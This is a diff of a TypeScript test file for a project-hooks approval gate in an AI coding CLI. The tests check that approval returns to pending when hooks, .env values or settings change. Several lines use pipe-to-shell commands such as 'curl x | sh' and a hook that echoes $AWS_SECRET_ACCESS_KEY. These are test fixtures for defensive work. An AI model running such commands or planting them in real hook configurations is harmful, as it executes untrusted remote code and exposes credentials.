@@ -18,10 +18,11 @@ import {
   getSeparatedHookSettings,
   summarizeProjectHooks,
   hashProjectHooks,
-  isProjectHooksPendingApproval,
+  applyProjectHooksApproval,
   getProjectHooksApprovalState,
   loadHookApprovals,
   resetHookApprovalsForTesting,
+  type ProjectHooksApproval,
 } from './hook-approvals.js';
 import { normalizeProjectRoot } from './approval-project-root.js';
 
@@ -31,6 +32,12 @@ describe('hook-approvals (hash-bound approval store)', () => {
   const hooks = {
     SessionStart: [{ hooks: [{ type: 'command', command: './setup.sh' }] }],
   };
+  const noEnv = { files: {}, settings: null };
+  const subject = (
+    block: Record<string, unknown> = hooks,
+    env: ProjectHooksApproval['env'] = noEnv,
+    root = projectRoot,
+  ): ProjectHooksApproval => ({ root, hooks: block, resolved: block, env });
 
   beforeEach(() => {
     dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hook-approvals-'));
@@ -49,39 +56,39 @@ describe('hook-approvals (hash-bound approval store)', () => {
   });
 
   it('is pending with no stored decision', () => {
-    expect(loadHookApprovals().getState(projectRoot, hooks)).toBe('pending');
+    expect(loadHookApprovals().getState(subject())).toBe('pending');
   });
 
   it.each(['approved', 'rejected'] as const)(
     'returns %s after that decision, across a reload',
     async (status) => {
-      await loadHookApprovals().setState(projectRoot, hooks, status);
-      expect(loadHookApprovals().getState(projectRoot, hooks)).toBe(status);
+      await loadHookApprovals().setState(subject(), status);
+      expect(loadHookApprovals().getState(subject())).toBe(status);
       resetHookApprovalsForTesting();
-      expect(loadHookApprovals().getState(projectRoot, hooks)).toBe(status);
+      expect(loadHookApprovals().getState(subject())).toBe(status);
     },
   );
 
   it('returns to pending once the hooks change', async () => {
-    await loadHookApprovals().setState(projectRoot, hooks, 'approved');
+    await loadHookApprovals().setState(subject(), 'approved');
     const edited = {
       SessionStart: [{ hooks: [{ type: 'command', command: 'curl evil' }] }],
     };
-    expect(loadHookApprovals().getState(projectRoot, edited)).toBe('pending');
+    expect(loadHookApprovals().getState(subject(edited))).toBe('pending');
   });
 
   it('hashes independently of key order', () => {
     const a = { PreToolUse: [{ matcher: 'Bash', hooks: [] }], Stop: [] };
     const b = { Stop: [], PreToolUse: [{ hooks: [], matcher: 'Bash' }] };
-    expect(hashProjectHooks(a)).toBe(hashProjectHooks(b));
+    expect(hashProjectHooks(subject(a))).toBe(hashProjectHooks(subject(b)));
   });
 
   it('writes one hash-bound record per project with owner-only permissions', async () => {
-    await loadHookApprovals().setState(projectRoot, hooks, 'approved');
+    await loadHookApprovals().setState(subject(), 'approved');
     const file = path.join(dir, HOOK_APPROVALS_FILENAME);
     const onDisk = JSON.parse(fs.readFileSync(file, 'utf-8'));
     expect(onDisk[normalizeProjectRoot(projectRoot)]).toEqual({
-      hash: hashProjectHooks(hooks),
+      hash: hashProjectHooks(subject()),
       status: 'approved',
     });
     if (os.platform() !== 'win32') {
@@ -97,20 +104,20 @@ describe('hook-approvals (hash-bound approval store)', () => {
       path.join(dir, HOOK_APPROVALS_FILENAME),
       JSON.stringify({
         [normalizeProjectRoot(projectRoot)]: {
-          hash: hashProjectHooks(hooks),
+          hash: hashProjectHooks(subject()),
           ...extra,
         },
       }),
     );
-    expect(loadHookApprovals().getState(projectRoot, hooks)).toBe('pending');
+    expect(loadHookApprovals().getState(subject())).toBe('pending');
   });
 
   it('binds an own __proto__ key into the hash', () => {
     const withProto = JSON.parse(
       '{"SessionStart": [], "__proto__": [{"hooks": [{"type": "command", "command": "x"}]}]}',
     );
-    expect(hashProjectHooks(withProto)).not.toBe(
-      hashProjectHooks({ SessionStart: [] }),
+    expect(hashProjectHooks(subject(withProto))).not.toBe(
+      hashProjectHooks(subject({ SessionStart: [] })),
     );
   });
 
@@ -120,7 +127,7 @@ describe('hook-approvals (hash-bound approval store)', () => {
       const file = path.join(dir, HOOK_APPROVALS_FILENAME);
       fs.writeFileSync(file, '{}', { mode: 0o644 });
       fs.chmodSync(file, 0o644);
-      await loadHookApprovals().setState(projectRoot, hooks, 'approved');
+      await loadHookApprovals().setState(subject(), 'approved');
       expect(fs.statSync(file).mode & 0o777).toBe(0o600);
     },
   );
@@ -129,21 +136,24 @@ describe('hook-approvals (hash-bound approval store)', () => {
     fs.writeFileSync(path.join(dir, HOOK_APPROVALS_FILENAME), '[1, 2');
     const approvals = loadHookApprovals();
     expect(approvals.errors).toHaveLength(1);
-    expect(approvals.getState(projectRoot, hooks)).toBe('pending');
+    expect(approvals.getState(subject())).toBe('pending');
   });
 
-  it('returns to pending once a variable the hooks read changes', async () => {
-    const block = {
-      PreToolUse: [
-        { hooks: [{ type: 'command', command: '${REPO_HOOK_CMD}' }] },
-      ],
-    };
-    vi.stubEnv('REPO_HOOK_CMD', 'echo audited');
-    await loadHookApprovals().setState(projectRoot, block, 'approved');
-    expect(getProjectHooksApprovalState(block, projectRoot)).toBe('approved');
-    vi.stubEnv('REPO_HOOK_CMD', 'curl evil | sh');
-    expect(getProjectHooksApprovalState(block, projectRoot)).toBe('pending');
-    expect(isProjectHooksPendingApproval(block, projectRoot)).toBe(true);
+  it.each([
+    ['a .env value changes', { files: { '/r/.env': { CMD: 'curl evil' } } }],
+    [
+      'a .env file appears',
+      { files: { '/r/.env': { CMD: 'echo' }, '/r/.qwen/.env': {} } },
+    ],
+    ['a .env file becomes unreadable', { files: { '/r/.env': null } }],
+    ['settings.env changes', { settings: { CMD: 'curl evil' } }],
+  ])('returns to pending once %s', async (_label, change) => {
+    const env = { files: { '/r/.env': { CMD: 'echo' } }, settings: null };
+    await loadHookApprovals().setState(subject(hooks, env), 'approved');
+    expect(getProjectHooksApprovalState(subject(hooks, env))).toBe('approved');
+    expect(
+      getProjectHooksApprovalState(subject(hooks, { ...env, ...change })),
+    ).toBe('pending');
   });
 
   it('sees a decision another process wrote, and keeps it when saving', async () => {
@@ -153,12 +163,14 @@ describe('hook-approvals (hash-bound approval store)', () => {
     fs.writeFileSync(
       file,
       JSON.stringify({
-        [other]: { hash: hashProjectHooks(hooks), status: 'rejected' },
+        [other]: { hash: hashProjectHooks(subject()), status: 'rejected' },
       }),
     );
-    expect(loadHookApprovals().getState('/work/other', hooks)).toBe('rejected');
+    expect(
+      loadHookApprovals().getState(subject(hooks, noEnv, '/work/other')),
+    ).toBe('rejected');
 
-    await approvals.setState(projectRoot, hooks, 'approved');
+    await approvals.setState(subject(), 'approved');
 
     const onDisk = JSON.parse(fs.readFileSync(file, 'utf-8'));
     expect(Object.keys(onDisk).sort()).toEqual(
@@ -176,38 +188,29 @@ describe('hook-approvals (hash-bound approval store)', () => {
       ? fs.readFileSync(file, 'utf-8')
       : undefined;
     await expect(
-      loadHookApprovals().setState(projectRoot, hooks, 'approved'),
+      loadHookApprovals().setState(subject(), 'approved'),
     ).rejects.toThrow();
     if (before !== undefined) {
       expect(fs.readFileSync(file, 'utf-8')).toBe(before);
     }
   });
 
-  describe('isProjectHooksPendingApproval', () => {
-    it.each([
-      ['no hooks', undefined],
-      ['a null hooks block', null],
-      ['an empty hooks block', {}],
-      [
-        'a block with nothing runnable',
-        { PreToolUse: [{ hooks: [] }], Stop: [], disabled: true },
-      ],
-    ])('is false for %s', (_label, value) => {
-      expect(getProjectHooksApprovalState(value, projectRoot)).toBeUndefined();
-      expect(isProjectHooksPendingApproval(value, projectRoot)).toBe(false);
-    });
-
-    it.each([
-      [undefined, true],
-      ['rejected', true],
-      ['approved', false],
-    ] as const)('with decision %s is %s', async (decision, expected) => {
-      if (decision) {
-        await loadHookApprovals().setState(projectRoot, hooks, decision);
-      }
-      expect(isProjectHooksPendingApproval(hooks, projectRoot)).toBe(expected);
-    });
-  });
+  it.each([
+    [false, undefined, [false, false]],
+    [true, undefined, [true, false]],
+    [true, 'rejected', [true, true]],
+    [true, 'approved', [false, false]],
+  ] as const)(
+    'gates the session from the stored decision (%#)',
+    async (gated, decision, gate) => {
+      if (decision) await loadHookApprovals().setState(subject(), decision);
+      const config = { setProjectHooksPendingApproval: vi.fn() };
+      applyProjectHooksApproval(config, gated ? subject() : undefined);
+      expect(config.setProjectHooksPendingApproval).toHaveBeenCalledWith(
+        ...gate,
+      );
+    },
+  );
 
   it('roots the project hooks at the folder holding .qwen/settings.json', () => {
     expect(
@@ -228,13 +231,17 @@ describe('hook-approvals (hash-bound approval store)', () => {
     const resolved = raw && structuredClone(raw);
     const system = { Stop: [] };
     const user = { SessionEnd: [] };
+    const repo = path.join(dir, 'repo');
+    fs.mkdirSync(repo);
+    fs.writeFileSync(path.join(repo, '.env'), 'CMD=echo\n');
     const separated = getSeparatedHookSettings({
+      merged: {},
       getSystemHooks: () => system,
       getUserHooks: () => user,
       getProjectHooks: () => resolved,
       workspace: {
-        path: path.join('/work', 'repo', '.qwen', 'settings.json'),
-        originalSettings: { hooks: raw },
+        path: path.join(repo, '.qwen', 'settings.json'),
+        originalSettings: { hooks: raw, env: { A: '1' } },
       },
     });
     // Only the gated scope is copied; the registry tags nested configs.
@@ -249,17 +256,61 @@ describe('hook-approvals (hash-bound approval store)', () => {
       }
     }
     expect(separated.projectHooksApproval).toEqual(
-      gated ? { root: path.join('/work', 'repo'), hooks: raw } : undefined,
+      gated
+        ? {
+            root: repo,
+            hooks: raw,
+            resolved,
+            env: {
+              files: {
+                [path.join(fs.realpathSync(repo), '.env')]: { CMD: 'echo' },
+              },
+              settings: { A: '1' },
+            },
+          }
+        : undefined,
     );
   });
 
-  it('withholds the unresolved block from the gate in an untrusted folder', () => {
+  it.each([
+    ['in an untrusted folder', undefined, hooks],
+    [
+      'when the resolved block runs nothing',
+      { Stop: [{ hooks: [{ type: 'nope', command: 'x' }] }] },
+      { Stop: [{ hooks: [{ type: '${T}', command: 'x' }] }] },
+    ],
+  ])('gates nothing %s', (_label, resolved, raw) => {
     expect(
       getProjectHooksForApproval({
-        getProjectHooks: () => undefined,
-        workspace: { originalSettings: { hooks } },
+        merged: {},
+        getProjectHooks: () => resolved,
+        workspace: {
+          path: '/r/.qwen/settings.json',
+          originalSettings: { hooks: raw },
+        },
       }),
     ).toBeUndefined();
+  });
+
+  it('gates and lists a hook whose type only resolves to a runnable one', () => {
+    const raw = {
+      Stop: [{ hooks: [{ type: '${T}', command: 'curl x | sh' }] }],
+    };
+    const resolved = {
+      Stop: [{ hooks: [{ type: 'command', command: 'curl x | sh' }] }],
+    };
+    const approval = getProjectHooksForApproval({
+      merged: {},
+      getProjectHooks: () => resolved,
+      workspace: {
+        path: '/r/.qwen/settings.json',
+        originalSettings: { hooks: raw },
+      },
+    });
+    expect(approval?.hooks).toBe(raw);
+    expect(summarizeProjectHooks(approval!.resolved, approval!.hooks)).toEqual([
+      'Stop  curl x | sh [type: ${T}]',
+    ]);
   });
 
   it('names the recovery for a rejected block and the review for a pending one', () => {
@@ -274,10 +325,6 @@ describe('hook-approvals (hash-bound approval store)', () => {
 });
 
 describe('summarizeProjectHooks', () => {
-  afterEach(() => {
-    vi.unstubAllEnvs();
-  });
-
   it('lists every hook with what decides where it runs and what it sends', () => {
     expect(
       summarizeProjectHooks({
@@ -319,26 +366,23 @@ describe('summarizeProjectHooks', () => {
     ]);
   });
 
-  it('shows what the shell substitutes, but not what the runner or the hook sets', () => {
-    vi.stubEnv('REPO_HOOK_CMD', 'echo audited');
-    vi.stubEnv('UNSET_VAR', undefined);
-    const [line] = summarizeProjectHooks({
+  it('words each row as written, never with resolved env values', () => {
+    const hook = (command: string, auth: string) => ({
       Stop: [
         {
-          hooks: [
-            {
-              type: 'command',
-              command:
-                '${REPO_HOOK_CMD} $UNSET_VAR $OWN $QWEN_PROJECT_DIR/x.sh',
-              env: { OWN: '1' },
-            },
-          ],
+          matcher: auth,
+          hooks: [{ type: 'command', command, env: { AUTH: auth } }],
         },
       ],
     });
-    expect(line).toBe(
-      'Stop  ${REPO_HOOK_CMD} $UNSET_VAR $OWN $QWEN_PROJECT_DIR/x.sh [env: OWN=1; vars: REPO_HOOK_CMD=echo audited, UNSET_VAR=(unset)]',
-    );
+    expect(
+      summarizeProjectHooks(
+        hook('echo secret-value', 'secret-value'),
+        hook('echo $AWS_SECRET_ACCESS_KEY', '${AWS_SECRET_ACCESS_KEY}'),
+      ),
+    ).toEqual([
+      'Stop  echo $AWS_SECRET_ACCESS_KEY [env: AUTH=${AWS_SECRET_ACCESS_KEY}; matcher: ${AWS_SECRET_ACCESS_KEY}]',
+    ]);
   });
 
   it.each([
@@ -352,8 +396,12 @@ describe('summarizeProjectHooks', () => {
       { Stop: [{ hooks: [{ type: 'prompt' }] }] },
     ],
     [
+      'a function hook, which JSON settings cannot give a callback',
+      { Stop: [{ hooks: [{ type: 'function', callback: () => {} }] }] },
+    ],
+    [
       'an unknown type',
-      { Stop: [{ hooks: [{ type: 'function', command: 'x' }] }] },
+      { Stop: [{ hooks: [{ type: 'nope', command: 'x' }] }] },
     ],
     [
       'an unknown event',
@@ -361,7 +409,6 @@ describe('summarizeProjectHooks', () => {
     ],
   ])('skips %s, which the registry would not run', (_label, hooks) => {
     expect(summarizeProjectHooks(hooks)).toEqual([]);
-    expect(isProjectHooksPendingApproval(hooks, '/work/repo')).toBe(false);
   });
 
   it('keeps each repo-controlled hook on one row without escapes or format characters', () => {
